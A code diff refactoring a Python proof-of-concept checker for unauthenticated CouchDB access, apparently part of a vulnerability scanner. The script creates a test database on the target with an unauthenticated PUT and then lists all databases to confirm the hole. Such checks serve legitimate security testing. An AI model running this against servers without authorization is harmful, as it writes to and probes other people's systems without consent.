@@ -12,21 +12,16 @@ import requests
 import warnings
 
 from urllib.parse import urlparse
-
-class unauth_BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['CouchDB 未授权漏洞', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/itestvuls"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.put(vulnurl)
-            vulnurl = self.url + "/_all_dbs"
+            vulnurl = url + "/_all_dbs"
             req2 = requests.get(vulnurl, headers=headers, timeout=6, verify=False)
             if r"itestvuls" in req2.text:
                 result[2] = '存在'
@@ -40,5 +35,5 @@ class unauth_BaseVerify:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = unauth_BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
